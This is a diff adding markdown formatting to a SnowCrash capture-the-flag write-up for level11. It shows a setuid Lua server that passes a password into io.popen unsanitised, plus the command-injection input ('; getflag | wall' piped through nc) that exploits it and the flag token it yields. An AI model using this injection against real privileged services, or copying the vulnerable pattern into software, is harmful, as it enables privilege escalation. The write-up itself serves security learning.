@@ -1,3 +1,8 @@
+# Subprocess on user-provided input in script run by privileged use
+# Privilege escalation via code injection
+
+
+```
 level11@SnowCrash:~$ ls -la
 total 16
 dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
@@ -6,6 +11,9 @@ d--x--x--x  1 root    users    340 Aug 30  2015 ..
 -r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
 -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
 -r-x------  1 level11 level11  675 Apr  3  2012 .profile
+```
+
+```
 level11@SnowCrash:~$ cat level11.lua 
 #!/usr/bin/env lua
 local socket = require("socket")
@@ -42,6 +50,8 @@ while 1 do
   client:close()
 end
 
+```
+
 Listens for incoming TCP connections on 127.0.0.1:5151.
 
 This Lua script runs a server on port 5151 that prompts for a password,
@@ -49,20 +59,25 @@ hashes it,
 checks if the hash matches a pre-set value. 
 If it matches, it congratulates the user; if not, it denies access.
 
+### Vulnerability
 There is a line that is easily exploitable
 
+```
 prog = io.popen("echo "..pass.." | sha1sum", "r")
+```
 
 it is easily exploitable because it constructs a shell command by directly embedding untrusted user input (pass) without any form of validation or sanitization. Here's why it's a security risk:
 
 That is what we will do:
 
+```
 level11@SnowCrash:~$ echo '; getflag | wall' | nc localhost 5151
                                                                                
 Broadcast Message from flag11@Snow                                             
         (somewhere) at 23:27 ...                                               
                                                                                
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s  
+```
 
 - This command exploits injection vulnerability
 The use of the semicolon ; in the injected command '; getflag | wall' terminates the echo command that is part of the script's command string.
